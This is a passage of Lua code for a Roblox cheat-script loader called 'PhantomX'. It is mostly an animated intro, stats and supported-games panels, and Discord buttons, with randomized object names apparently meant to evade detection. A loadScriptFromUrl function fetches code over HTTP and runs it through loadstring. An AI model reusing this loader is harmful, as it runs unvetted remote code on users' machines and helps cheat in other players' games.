local fadeTween = TweenService:Create(fade, TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 1})
fadeTween:Play()

playSound(CROW_SOUND_ID, 0.8, 0.6)

-- Camera transition loop (skip-aware)
local transitionTime = 1.2
local transStart = os.clock()
while os.clock() - transStart < transitionTime do
    if skipRequested then break end
    local rawAlpha = clamp01((os.clock() - transStart) / transitionTime)
    local alpha = smoother(rawAlpha)
    local currentPos = initialCamCF.Position:Lerp(targetSkyCamCF.Position, alpha)
    local arcOffset = math.sin(rawAlpha * math.pi) * 20
    local adjustedPos = currentPos + Vector3.new(0, arcOffset, 0)
    local currentRot = initialCamCF.Rotation:Lerp(targetSkyCamCF.Rotation, alpha)
    camera.CFrame = CFrame.new(adjustedPos) * currentRot
    camera.FieldOfView = lerp(oldFOV, 55, alpha)
    RunService.RenderStepped:Wait()
end
camera.CFrame = targetSkyCamCF
camera.FieldOfView = 55

if skipRequested then
    if fadeTween then fadeTween:Cancel() end
    if topLbTween then topLbTween:Cancel() end
    if bottomLbTween then bottomLbTween:Cancel() end
    fade.BackgroundTransparency = 1
    topLetterbox.Size = UDim2.new(1, 0, 0, 28)
    bottomLetterbox.Size = UDim2.new(1, 0, 0, 28)
end

-- Flock animation loop (skip-aware)
local masterFlockDuration = 3.8
local flockStartTime = os.clock()
local camPos = targetSkyCamCF.Position
while true do
    if skipRequested then break end
    local elapsed = os.clock() - flockStartTime
    local rawProgress = clamp01(elapsed / masterFlockDuration)
    if rawProgress >= 1 then break end
    for _, info in ipairs(rightFlock) do
        local p = getRightPosition(info, rawProgress)
        local nextP = getRightPosition(info, math.min(rawProgress + .01, 1))
        local dir = (nextP - p).Unit
        local cf = CFrame.lookAt(p, p + dir)
        local flap = math.rad(55) + math.rad(35) * wingbeat(elapsed, 12, info.Index)
        info.Crow.SetFlight(cf, flap, math.rad(15), 0, 0)
    end
    for _, info in ipairs(leftFlock) do
        local p = getLeftPosition(info, rawProgress)
        local nextP = getLeftPosition(info, math.min(rawProgress + .01, 1))
        local dir = (nextP - p).Unit
        local cf = CFrame.lookAt(p, p + dir)
        local flap = math.rad(55) + math.rad(35) * wingbeat(elapsed, 12, info.Index)
        info.Crow.SetFlight(cf, flap, math.rad(15), 0, 0)
    end
    camera.CFrame = CFrame.lookAt(camPos, collisionPoint)
    camera.FieldOfView = lerp(60, 45, smooth(rawProgress))
    RunService.RenderStepped:Wait()
end
destroyFlock(rightFlock)
destroyFlock(leftFlock)

-- Dive section (skip-aware)
local diveStartPos = camPos + Vector3.new(0, 35, -110)
local diveCrow = makeCrow(diveStartPos, 1.2)

playSound(CROW_SOUND_ID, 1.0, 1.35)

local diveDuration = 1.3
local diveStart = os.clock()
TweenService:Create(vignette, TweenInfo.new(0.4), {ImageTransparency = .2}):Play()
while true do
    if skipRequested then break end
    local elapsed = os.clock() - diveStart
    local raw = clamp01(elapsed / diveDuration)
    if raw >= 1 then break end
    local targetCrashPos = camPos + (camera.CFrame.LookVector * 0.4)
    local p = diveStartPos:Lerp(targetCrashPos, smoother(raw))
    local cf = CFrame.lookAt(p, camPos)
    local flap = math.rad(70) + math.rad(45) * wingbeat(elapsed, 18, 0)
    local flex = math.rad(30) * wingbeat(elapsed, 18, -.8)
    diveCrow.SetFlight(cf, flap, flex, 0, 0)
    local shakeAmount = math.pow(raw, 3) * .2
    camera.CFrame = CFrame.lookAt(camPos, collisionPoint) * CFrame.Angles((math.random() - .5) * shakeAmount, (math.random() - .5) * shakeAmount, (math.random() - .5) * shakeAmount)
    RunService.RenderStepped:Wait()
end

if not skipRequested then
    flash.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    flash.BackgroundTransparency = 0
    TweenService:Create(flash, TweenInfo.new(.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
    TweenService:Create(vignette, TweenInfo.new(.3), {ImageTransparency = .4}):Play()
else
    vignette.ImageTransparency = 1
end
if diveCrow.Model and diveCrow.Model.Parent then diveCrow.Model:Destroy() end

-- Title
local TitleContainer = Instance.new("Frame", gui)
TitleContainer.Name = getRandomName()
TitleContainer.AnchorPoint = Vector2.new(0.5, 0.5)
TitleContainer.Position = UDim2.new(0.5, 0, 0.45, 0)
TitleContainer.Size = UDim2.new(0, 500, 0, 150)
TitleContainer.BackgroundTransparency = 1

local MainTitle = Instance.new("TextLabel", TitleContainer)
MainTitle.Name = getRandomName()
MainTitle.AnchorPoint = Vector2.new(0.5, 0)
MainTitle.Position = UDim2.new(0.5, 0, 0, 0)
MainTitle.Size = UDim2.new(1, 0, 0, 80)
MainTitle.BackgroundTransparency = 1
MainTitle.Font = Enum.Font.Creepster
MainTitle.Text = "PHANTOMX"
MainTitle.TextColor3 = TEXT_DARK_RED
MainTitle.TextSize = 90
MainTitle.TextStrokeColor3 = TEXT_STROKE_BLACK
MainTitle.TextStrokeTransparency = 0.1

local WelcomeSub = Instance.new("TextLabel", TitleContainer)
WelcomeSub.Name = getRandomName()
WelcomeSub.AnchorPoint = Vector2.new(0.5, 0)
WelcomeSub.Position = UDim2.new(0.5, 0, 0, 85)
WelcomeSub.Size = UDim2.new(1, 0, 0, 30)
WelcomeSub.BackgroundTransparency = 1
WelcomeSub.Font = Enum.Font.SpecialElite
WelcomeSub.Text = "W E L C O M E"
WelcomeSub.TextColor3 = Color3.fromRGB(180, 25, 35)
WelcomeSub.TextSize = 30
WelcomeSub.TextTransparency = 0.1

local drippingActive = true
local function drip(x, delayTime, height, width)
    task.delay(delayTime, function()
        if not drippingActive or not gui.Parent then return end
        local d = Instance.new("Frame", gui)
        d.Name = getRandomName()
        d.AnchorPoint = Vector2.new(.5, 0)
        d.Position = UDim2.fromScale(x, 0)
        d.Size = UDim2.fromScale(width, 0)
        d.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
        d.BorderSizePixel = 0
        d.ZIndex = 15
        Instance.new("UICorner", d).CornerRadius = UDim.new(.5, 0)
        TweenService:Create(d, TweenInfo.new(1.2, Enum.EasingStyle.Quart), {Size = UDim2.fromScale(width, height)}):Play()
        task.delay(1.5, function()
            if d and d.Parent then
                TweenService:Create(d, TweenInfo.new(.5), {BackgroundTransparency = 1}):Play()
                task.delay(.6, function() if d then d:Destroy() end end)
            end
        end)
    end)
end
task.spawn(function()
    while drippingActive do
        for i = 1, 4 do
            drip(math.random(3, 97) / 100, math.random() * 0.25, math.random(25, 50) / 100, math.random(3, 7) / 1000)
        end
        task.wait(0.6)
    end
end)

-- Viewport with landing crow (skip-aware)
local viewport = Instance.new("ViewportFrame", TitleContainer)
viewport.Name = getRandomName()
viewport.Size = UDim2.new(0, 95, 0, 95)
viewport.AnchorPoint = Vector2.new(0.5, 1)
viewport.Position = UDim2.new(0.795, 0, 0.32, 0)
viewport.BackgroundTransparency = 1
viewport.ZIndex = 35
viewport.LightColor = Color3.fromRGB(255, 40, 40)
viewport.Ambient = Color3.fromRGB(90, 10, 10)

local world = Instance.new("WorldModel", viewport)
world.Name = getRandomName()
local vCam = Instance.new("Camera", viewport)
vCam.Name = getRandomName()
vCam.FieldOfView = 30
viewport.CurrentCamera = vCam

local landingCrow = makeCrow(Vector3.new(0, 0, 0), 0.44)
landingCrow.Model.Parent = world
vCam.CFrame = CFrame.lookAt(Vector3.new(0.3, 2.5, 2.8), Vector3.new(0, 1.9, 0))

local landingStart = os.clock()
while os.clock() - landingStart < 1.0 do
    if skipRequested then break end
    local raw = clamp01((os.clock() - landingStart) / 1.0)
    local a = smoother(raw)
    local cf = CFrame.new(0, lerp(3.8, 1.95, a), lerp(-1.5, 0, a)) * CFrame.Angles(math.rad(lerp(-10, 4, a)), 0, 0)
    landingCrow.ApplyBody(cf, 0, 0)
    if raw < .6 then
        landingCrow.ApplyFlyingWings(cf, math.rad(65) * wingbeat(os.clock(), 15, 0) * (1 - smoother(math.max(0, (raw - .35) / .65))), math.rad(25) * wingbeat(os.clock(), 15, -.8) * (1 - smoother(math.max(0, (raw - .35) / .65))), 0, 0)
    else
        landingCrow.ApplyFoldedWings(cf, smoother((raw - .6) / .4))
    end
    landingCrow.ApplyStandingLegs(cf)
    RunService.RenderStepped:Wait()
end
landingCrow.SetStanding(CFrame.new(0, 1.95, 0))

-- Stats
local StatsGui = Instance.new("Frame", gui)
StatsGui.Name = getRandomName()
StatsGui.Size = UDim2.new(0, 180, 0, 130)
StatsGui.AnchorPoint = Vector2.new(0, 0.5)
StatsGui.Position = UDim2.new(0, 10, 0.58, 0)
StatsGui.BackgroundColor3 = PANEL
StatsGui.BackgroundTransparency = 0.1
StatsGui.BorderSizePixel = 0
StatsGui.ZIndex = 300
Instance.new("UICorner", StatsGui).CornerRadius = UDim.new(0, 10)

local stStroke = Instance.new("UIStroke", StatsGui)
stStroke.Color = RED_NORMAL
stStroke.Thickness = 1
stStroke.Transparency = 0.3

local stHeader = Instance.new("TextLabel", StatsGui)
stHeader.Name = getRandomName()
stHeader.Size = UDim2.new(1, -16, 0, 18)
stHeader.Position = UDim2.new(0, 8, 0, 5)
stHeader.BackgroundTransparency = 1
stHeader.Text = "SYSTEM & GAME INFO"
stHeader.TextColor3 = RED_BRIGHT
stHeader.TextSize = 9
stHeader.Font = Enum.Font.GothamBlack
stHeader.TextXAlignment = Enum.TextXAlignment.Left
stHeader.ZIndex = 301

local function mkStat(y, t)
    local l = Instance.new("TextLabel", StatsGui)
    l.Name = getRandomName()
    l.Size = UDim2.new(1, -16, 0, 15)
    l.Position = UDim2.new(0, 8, 0, y)
    l.BackgroundTransparency = 1
    l.RichText = true
    l.TextColor3 = MUTED
    l.TextSize = 9
    l.Font = Enum.Font.GothamBold
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = t
    l.ZIndex = 301
    return l
end

local shortMapName = string.sub(placeName, 1, 14) .. (#placeName > 14 and "..." or "")

local mapLabel = mkStat(24, "MAP: <font color='rgb(235,35,50)'>"..shortMapName.."</font>")
local execLabel = mkStat(40, "EXECUTOR: <font color='rgb(235,35,50)'>"..EXECUTOR.."</font>")
local fLabel = mkStat(56, "FPS: <font color='rgb(235,35,50)'>60</font>")
local pLabel = mkStat(72, "PING: <font color='rgb(235,35,50)'>40ms</font>")
local plLabel = mkStat(88, "PLAYERS: <font color='rgb(235,35,50)'>1</font>")
local upLabel = mkStat(104, "UPTIME: <font color='rgb(235,35,50)'>00:00</font>")

-- Games list
local GamesGui = Instance.new("Frame", gui)
GamesGui.Name = getRandomName()
GamesGui.Size = UDim2.new(0, 185, 0, 260)
GamesGui.AnchorPoint = Vector2.new(1, 0.5)
GamesGui.Position = UDim2.new(1, -6, 0.48, 0)
GamesGui.BackgroundColor3 = PANEL
GamesGui.BackgroundTransparency = 0.1
GamesGui.BorderSizePixel = 0
GamesGui.ZIndex = 300
Instance.new("UICorner", GamesGui).CornerRadius = UDim.new(0, 10)

local gmStroke = Instance.new("UIStroke", GamesGui)
gmStroke.Color = RED_NORMAL
gmStroke.Thickness = 1
gmStroke.Transparency = 0.3

local gmHeader = Instance.new("TextLabel", GamesGui)
gmHeader.Name = getRandomName()
gmHeader.Size = UDim2.new(1, -16, 0, 20)
gmHeader.Position = UDim2.new(0, 8, 0, 6)
gmHeader.BackgroundTransparency = 1
gmHeader.Text = "SUPPORTED GAMES"
gmHeader.TextColor3 = WHITE
gmHeader.TextSize = 9
gmHeader.Font = Enum.Font.GothamBlack
gmHeader.TextXAlignment = Enum.TextXAlignment.Left
gmHeader.ZIndex = 301

local GamesScroll = Instance.new("ScrollingFrame", GamesGui)
GamesScroll.Name = getRandomName()
GamesScroll.Size = UDim2.new(1, -10, 1, -32)
GamesScroll.Position = UDim2.new(0, 5, 0, 28)
GamesScroll.BackgroundTransparency = 1
GamesScroll.CanvasSize = UDim2.new(0, 0, 0, 330)
GamesScroll.ScrollBarThickness = 2
GamesScroll.ScrollBarImageColor3 = RED_BRIGHT
GamesScroll.ZIndex = 301

local listLayout = Instance.new("UIListLayout", GamesScroll)
listLayout.Padding = UDim.new(0, 6)
listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
listLayout.SortOrder = Enum.SortOrder.LayoutOrder

local cardCounter = 0
local function mkCard(n, imgUrl, act)
    cardCounter += 1
    local c = Instance.new("Frame", GamesScroll)
    c.Name = getRandomName()
    c.LayoutOrder = cardCounter
    c.Size = UDim2.new(1, -6, 0, 72)
    c.BackgroundColor3 = PANEL_HOVER
    c.BorderSizePixel = 0
    c.ZIndex = 302
    Instance.new("UICorner", c).CornerRadius = UDim.new(0, 8)

    local s = Instance.new("UIStroke", c)
    s.Color = act and RED_BRIGHT or RED_NORMAL
    s.Thickness = act and 1.5 or 1
    s.Transparency = act and 0 or 0.5

    local img = Instance.new("ImageLabel", c)
    img.Name = getRandomName()
    img.Size = UDim2.new(1, -8, 0, 36)
    img.Position = UDim2.new(0, 4, 0, 4)
    img.BackgroundColor3 = PANEL
    img.ScaleType = Enum.ScaleType.Crop
    img.ZIndex = 303
    Instance.new("UICorner", img).CornerRadius = UDim.new(0, 5)

    if imgUrl and imgUrl ~= "" then
        img.Image = imgUrl
        table.insert(thumbnailCards, {ImageLabel = img, Url = imgUrl})
    end

    local nl = Instance.new("TextLabel", c)
    nl.Name = getRandomName()
    nl.Size = UDim2.new(1, -8, 0, 12)
    nl.Position = UDim2.new(0, 4, 0, 42)
    nl.BackgroundTransparency = 1
    nl.Text = n
    nl.TextColor3 = WHITE
    nl.Font = Enum.Font.GothamBold
    nl.TextSize = 9
    nl.TextXAlignment = Enum.TextXAlignment.Left
    nl.ZIndex = 303

    local sl = Instance.new("TextLabel", c)
    sl.Name = getRandomName()
    sl.Size = UDim2.new(1, -8, 0, 10)
    sl.Position = UDim2.new(0, 4, 0, 56)
    sl.BackgroundTransparency = 1
    sl.Text = (imgUrl == "" or not imgUrl) and "DEVELOPING 🛠️" or (act and "ACTIVE GAME ⚡" or "ONLINE 🟢")
    sl.TextColor3 = (imgUrl == "" or not imgUrl) and MUTED or (act and RED_BRIGHT or Color3.fromRGB(0, 255, 120))
    sl.Font = Enum.Font.GothamBold
    sl.TextSize = 8
    sl.TextXAlignment = Enum.TextXAlignment.Left
    sl.ZIndex = 303
end

mkCard("Timebomb Duels", "https://www.roblox.com/asset-thumbnail/image?assetId=11379739543&width=420&height=420&format=png", foundGame and foundGame.name == "TimeBomb Duels")
mkCard("Murder Mastery", "https://www.roblox.com/asset-thumbnail/image?assetId=142823291&width=420&height=420&format=png", foundGame and foundGame.name == "Murder Mastery")
mkCard("Flick", "https://www.roblox.com/asset-thumbnail/image?assetId=136801880565837&width=420&height=420&format=png", foundGame and foundGame.name == "Flick")
mkCard("Coming Soon", "", false)

task.spawn(function()
    while gui and gui.Parent do
        task.wait(5)
        for _, cardInfo in ipairs(thumbnailCards) do
            if cardInfo.ImageLabel and cardInfo.ImageLabel.Parent and cardInfo.Url ~= "" then
                task.spawn(function()
                    cardInfo.ImageLabel.Image = ""
                    cardInfo.ImageLabel.Image = cardInfo.Url
                end)
            end
        end
    end
end)

-- Bottom menu
local Menu = Instance.new("Frame", gui)
Menu.Name = getRandomName()
Menu.AnchorPoint = Vector2.new(0.5, 1)
Menu.Position = UDim2.new(0.5, 0, 1.3, 0)
Menu.Size = UDim2.new(0, 330, 0, 130)
Menu.BackgroundTransparency = 1
Menu.ZIndex = 300

local CloseBtn = Instance.new("ImageButton", gui)
CloseBtn.Name = getRandomName()
CloseBtn.Size = UDim2.new(0, 38, 0, 38)
CloseBtn.Position = UDim2.new(0, 14, 0, 85)
CloseBtn.BackgroundColor3 = PANEL
CloseBtn.BackgroundTransparency = 0.1
CloseBtn.BorderSizePixel = 0
CloseBtn.Image = "rbxassetid://130629964514885"
CloseBtn.ImageColor3 = WHITE
CloseBtn.ScaleType = Enum.ScaleType.Fit
CloseBtn.ZIndex = 500

local CloseScale = Instance.new("UIScale", CloseBtn)
local ClosePad = Instance.new("UIPadding", CloseBtn)
ClosePad.PaddingTop = UDim.new(0, 8)
ClosePad.PaddingBottom = UDim.new(0, 8)
ClosePad.PaddingLeft = UDim.new(0, 8)
ClosePad.PaddingRight = UDim.new(0, 8)
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 10)

local CloseStroke = Instance.new("UIStroke", CloseBtn)
CloseStroke.Color = RED_NORMAL
CloseStroke.Thickness = 1
CloseStroke.Transparency = 0.3

CloseBtn.MouseEnter:Connect(function()
    Tween(CloseBtn, 0.18, {BackgroundColor3 = RED_DARK, ImageColor3 = RED_BRIGHT})
    Tween(CloseStroke, 0.18, {Color = RED_BRIGHT, Transparency = 0})
end)
CloseBtn.MouseLeave:Connect(function()
    Tween(CloseScale, 0.25, {Scale = 1.0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    Tween(CloseBtn, 0.18, {BackgroundColor3 = PANEL, ImageColor3 = WHITE})
    Tween(CloseStroke, 0.18, {Color = RED_NORMAL, Transparency = 0.3})
end)
CloseBtn.MouseButton1Down:Connect(function()
    Tween(CloseScale, 0.1, {Scale = 0.92}, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
end)
CloseBtn.MouseButton1Up:Connect(function()
    Tween(CloseScale, 0.35, {Scale = 1.0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end)

local StartHolder = Instance.new("Frame", Menu)
StartHolder.Name = getRandomName()
StartHolder.AnchorPoint = Vector2.new(0.5, 0)
StartHolder.Position = UDim2.new(0.5, 0, 0, 0)
StartHolder.Size = UDim2.new(0, 260, 0, 54)
StartHolder.BackgroundTransparency = 1

local StartScale = Instance.new("UIScale", StartHolder)

local Start = Instance.new("TextButton", StartHolder)
Start.Name = getRandomName()
Start.AnchorPoint = Vector2.new(0.5, 0.5)
Start.Position = UDim2.fromScale(0.5, 0.5)
Start.Size = UDim2.fromScale(1, 1)
Start.BackgroundColor3 = RED_DARK_START
Start.BorderSizePixel = 0
Start.AutoButtonColor = false
Start.ClipsDescendants = true
Start.Text = ""
Instance.new("UICorner", Start).CornerRadius = UDim.new(0, 10)

local StartGradient = Instance.new("UIGradient", Start)
StartGradient.Rotation = 90
StartGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, RED_DARK_START),
    ColorSequenceKeypoint.new(1, RED_DARK_END)
})

local StartStroke = Instance.new("UIStroke", Start)
StartStroke.Color = Color3.fromRGB(120, 15, 25)
StartStroke.Thickness = 1.5
StartStroke.Transparency = 0.3
StartStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local StartText = Instance.new("TextLabel", Start)
StartText.Name = getRandomName()
StartText.AnchorPoint = Vector2.new(0.5, 0)
StartText.Position = UDim2.new(0.5, 0, 0, 8)
StartText.Size = UDim2.new(1, 0, 0, 24)
StartText.BackgroundTransparency = 1
StartText.Font = Enum.Font.Creepster
StartText.Text = "ENTER THE SCRIPT"
StartText.TextColor3 = WHITE
StartText.TextSize = 24
StartText.TextXAlignment = Enum.TextXAlignment.Center

local StartSub = Instance.new("TextLabel", Start)
StartSub.Name = getRandomName()
StartSub.AnchorPoint = Vector2.new(0.5, 0)
StartSub.Position = UDim2.new(0.5, 0, 0, 33)
StartSub.Size = UDim2.new(1, 0, 0, 13)
StartSub.BackgroundTransparency = 1
StartSub.Font = Enum.Font.SpecialElite
StartSub.Text = "HOLD TO START"
StartSub.TextColor3 = MUTED
StartSub.TextSize = 10
StartSub.TextXAlignment = Enum.TextXAlignment.Center

local function ShowNotification(text, color)
    local OldNotif = gui:FindFirstChild("CenteredNotif")
    if OldNotif then OldNotif:Destroy() end
    local Notif = Instance.new("Frame", gui)
    Notif.Name = "CenteredNotif"
    Notif.AnchorPoint = Vector2.new(0.5, 0.5)
    Notif.Position = UDim2.new(0.5, 0, 0.52, 0)
    Notif.Size = UDim2.new(0, 240, 0, 38)
    Notif.BackgroundColor3 = PANEL
    Notif.BackgroundTransparency = 1
    Instance.new("UICorner", Notif).CornerRadius = UDim.new(0, 8)
    local Stroke = Instance.new("UIStroke", Notif)
    Stroke.Color = color or RED_BRIGHT
    Stroke.Thickness = 1
    Stroke.Transparency = 1
    local Label = Instance.new("TextLabel", Notif)
    Label.Size = UDim2.new(1, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Font = Enum.Font.GothamBold
    Label.Text = text
    Label.TextColor3 = WHITE
    Label.TextSize = 12
    Label.TextTransparency = 1
    Label.TextXAlignment = Enum.TextXAlignment.Center
    Tween(Notif, 0.3, {BackgroundTransparency = 0.15, Position = UDim2.new(0.5, 0, 0.48, 0)})
    Tween(Stroke, 0.3, {Transparency = 0.3})
    Tween(Label, 0.3, {TextTransparency = 0})
    task.delay(2, function()
        if Notif and Notif.Parent then
            local close = Tween(Notif, 0.3, {BackgroundTransparency = 1, Position = UDim2.new(0.5, 0, 0.46, 0)})
            Tween(Stroke, 0.3, {Transparency = 1})
            Tween(Label, 0.3, {TextTransparency = 1})
            close.Completed:Wait()
            Notif:Destroy()
        end
    end)
end

local function MakeButton(name, text, icon, xPosition, accentColor, notifMessage, copyText)
    local Holder = Instance.new("Frame", Menu)
    Holder.Name = name .. "Holder"
    Holder.Position = UDim2.new(xPosition, 0, 0, 65)
    Holder.Size = UDim2.new(0, 158, 0, 52)
    Holder.BackgroundTransparency = 1
    local Button = Instance.new("TextButton", Holder)
    Button.Name = name
    Button.Size = UDim2.fromScale(1, 1)
    Button.BackgroundColor3 = PANEL
    Button.AutoButtonColor = false
    Button.Text = ""
    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 9)
    local BtnScale = Instance.new("UIScale", Button)
    local Stroke = Instance.new("UIStroke", Button)
    Stroke.Color = Color3.fromRGB(52, 48, 52)
    Stroke.Thickness = 1
    Stroke.Transparency = 0.25
    local IconHolder = Instance.new("Frame", Button)
    IconHolder.Size = UDim2.new(0, 34, 0, 34)
    IconHolder.Position = UDim2.new(0, 9, 0.5, 0)
    IconHolder.AnchorPoint = Vector2.new(0, 0.5)
    IconHolder.BackgroundColor3 = accentColor
    IconHolder.BackgroundTransparency = 0.88
    Instance.new("UICorner", IconHolder).CornerRadius = UDim.new(0, 8)
    local Icon = Instance.new("ImageLabel", IconHolder)
    Icon.Size = UDim2.new(0, 21, 0, 21)
    Icon.Position = UDim2.fromScale(0.5, 0.5)
    Icon.AnchorPoint = Vector2.new(0.5, 0.5)
    Icon.BackgroundTransparency = 1
    Icon.Image = icon
    Icon.ImageColor3 = accentColor
    local Title = Instance.new("TextLabel", Button)
    Title.Position = UDim2.new(0, 52, 0.5, -6)
    Title.Size = UDim2.new(1, -58, 0, 17)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.Text = text
    Title.TextColor3 = WHITE
    Title.TextSize = 11
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Button.MouseButton1Down:Connect(function()
        Tween(BtnScale, 0.1, {Scale = 0.93}, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    end)
    Button.MouseButton1Up:Connect(function()
        Tween(BtnScale, 0.35, {Scale = 1.0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    end)
    Button.MouseButton1Click:Connect(function()
        ClickSound:Play()
        Copy(copyText)
        ShowNotification(notifMessage, accentColor)
    end)
    Button.MouseEnter:Connect(function()
        Tween(Button, 0.18, {BackgroundColor3 = PANEL_HOVER})
        Tween(Stroke, 0.18, {Color = accentColor, Transparency = 0.05})
    end)
    Button.MouseLeave:Connect(function()
        Tween(BtnScale, 0.25, {Scale = 1.0}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        Tween(Button, 0.18, {BackgroundColor3 = PANEL})
        Tween(Stroke, 0.18, {Color = Color3.fromRGB(52, 48, 52), Transparency = 0.25})
    end)
    return Button
end

MakeButton("Discord", "DISCORD", DISCORD_ICON, 0, DISCORD_PURPLE, "Copied Discord Link!", DISCORD_INVITE)
MakeButton("Developer", "DEVELOPER", DEVELOPER_ICON, 0.52, DEVELOPER_COLOR, "Copied Developer Tag!", DEVELOPER_USERNAME)

local iConn = RunService.RenderStepped:Connect(function()
    local t = os.clock()
    local p = .5 + math.sin(t * 8) * .5
    if landingCrow and landingCrow.Eyes then
        for _, eye in ipairs(landingCrow.Eyes) do
            eye.Color = RED_BRIGHT:Lerp(Color3.fromRGB(255, 150, 150), p)
        end
    end
    landingCrow.ApplyFoldedWings(CFrame.new(0, 1.95 + math.sin(t*2)*0.015, 0), 1)
end)

task.spawn(function()
    while gui and gui.Parent do
        task.wait(1)
        pcall(function()
            local fps = math.floor(1 / RunService.RenderStepped:Wait())
            local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
            local uptime = math.floor(workspace.DistributedGameTime)
            local m = math.floor(uptime / 60)
            local s = uptime % 60
            fLabel.Text = "FPS: <font color='rgb(235,35,50)'>"..fps.."</font>"
            pLabel.Text = "PING: <font color='rgb(235,35,50)'>"..ping.."ms</font>"
            plLabel.Text = "PLAYERS: <font color='rgb(235,35,50)'>"..#Players:GetPlayers().."</font>"
            upLabel.Text = "UPTIME: <font color='rgb(235,35,50)'>"..string.format("%02d:%02d", m, s).."</font>"
        end)
    end
end)

local function clean()
    if iConn then iConn:Disconnect() end
    drippingActive = false
    if SkipBtn and SkipBtn.Parent then SkipBtn:Destroy() end
    Tween(StatsGui, 0.5, {Position = UDim2.new(0, -220, 0.58, 0)}, Enum.EasingStyle.Quart, Enum.EasingDirection.In)
    Tween(GamesGui, 0.5, {Position = UDim2.new(1, 220, 0.48, 0)}, Enum.EasingStyle.Quart, Enum.EasingDirection.In)
    Tween(Menu, 0.5, {Position = UDim2.new(0.5, 0, 1.25, 0)}, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
    Tween(CloseBtn, 0.4, {BackgroundTransparency = 1, ImageTransparency = 1})
    Tween(topLetterbox, 0.5, {Size = UDim2.new(1, 0, 0, 0)})
    Tween(bottomLetterbox, 0.5, {Size = UDim2.new(1, 0, 0, 0)})
    Tween(MainTitle, 0.4, {TextTransparency = 1, TextStrokeTransparency = 1})
    Tween(WelcomeSub, 0.4, {TextTransparency = 1})
    Tween(fade, 0.5, {BackgroundTransparency = 1})
    task.wait(0.55)
    pcall(function()
        if atmosphere and atmosphere.Parent then atmosphere:Destroy() end
        if colorEffect and colorEffect.Parent then colorEffect:Destroy() end
        if landingCrow and landingCrow.Model and landingCrow.Model.Parent then landingCrow.Model:Destroy() end
        for _, m in ipairs(activeModels) do
            if m and m.Parent then m:Destroy() end
        end
        camera.CameraType = oldCameraType
        camera.CameraSubject = oldCameraSubject
        camera.FieldOfView = oldFOV
        if initialCamCF then camera.CFrame = initialCamCF end
        restoreRobloxGui()
        gui:Destroy()
    end)
    shared.PhantomX_Loader_Executed = nil
end

local function loadScriptFromUrl(url, delay)
    if not url or url == "" then return false end
    task.wait(delay or 0)
    local success, content = pcall(function() return game:HttpGet(url, true) end)
    if not success or not content then return false end
    local func, err = loadstring(content)
    if not func then return false end
    local ok, err2 = pcall(func)
    if not ok then return false end
    return true
end

-- ====== MODE SELECTOR (TimeBomb only) ======
local function ShowModeSelector()
    local SEL_DISCORD_URL = "https://discord.gg/uRtbxxxrau"
    local SEL_DISCORD_ICON = "rbxassetid://116940889693806"
    local SEL_PRESS_SOUND = "rbxassetid://15675032796"

    local ICONS = {
        Free = "rbxassetid://13967667066",
        Premium = "rbxassetid://11835491319",
        Device = "rbxassetid://14040311060",
    }
    local COLORS = {
        Background = Color3.fromRGB(13, 17, 28),
        Panel = Color3.fromRGB(22, 28, 44),
        PanelLight = Color3.fromRGB(32, 40, 60),
        Text = Color3.fromRGB(239, 239, 242),
        Muted = Color3.fromRGB(151, 152, 160),
        Free = Color3.fromRGB(190, 192, 198),
        Premium = Color3.fromRGB(218, 181, 105),
        Device = Color3.fromRGB(119, 183, 198),
        Stroke = Color3.fromRGB(50, 60, 85),
    }
    local FONT = Enum.Font.Gotham
    local FONT_BOLD = Enum.Font.GothamSemibold

    local OldGui = playerGui:FindFirstChild("PhantomXModeSelector")
    if OldGui then OldGui:Destroy() end
    local OldBlur = Lighting:FindFirstChild("PhantomXBlur")
    if OldBlur then OldBlur:Destroy() end

    local function SelTween(object, duration, properties, style, direction)
        local info = TweenInfo.new(duration, style or Enum.EasingStyle.Quart, direction or Enum.EasingDirection.Out)
        local animation = TweenService:Create(object, info, properties)
        animation:Play()
        return animation
    end
    local function AddCorner(object, radius)
        local c = Instance.new("UICorner")
        c.CornerRadius = UDim.new(0, radius)
        c.Parent = object
        return c
    end
    local function AddStroke(object, color, transparency, thickness)
        local s = Instance.new("UIStroke")
        s.Color = color
        s.Transparency = transparency or 0
        s.Thickness = thickness or 1
        s.Parent = object
        return s
    end
    local function AddGradient(object, color1, color2, rotation)
        local g = Instance.new("UIGradient")
        g.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, color1), ColorSequenceKeypoint.new(1, color2)})
        g.Rotation = rotation or 90
        g.Parent = object
        return g
    end
    local function PlaySelPressSound(parent)
        local s = Instance.new("Sound")
        s.SoundId = SEL_PRESS_SOUND
        s.Volume = 0.35
        s.Parent = parent
        s:Play()
        s.Ended:Connect(function() s:Destroy() end)
        task.delay(4, function() if s.Parent then s:Destroy() end end)
    end
    local function CopySelDiscord()
        if typeof(setclipboard) == "function" then
            local success = pcall(function() setclipboard(SEL_DISCORD_URL) end)
            if success then return true end
        end
        return false
    end

    local ModeScreenGui = Instance.new("ScreenGui")
    ModeScreenGui.Name = "PhantomXModeSelector"
    ModeScreenGui.ResetOnSpawn = false
    ModeScreenGui.IgnoreGuiInset = true
    ModeScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ModeScreenGui.Parent = playerGui

    local Blur = Instance.new("BlurEffect")
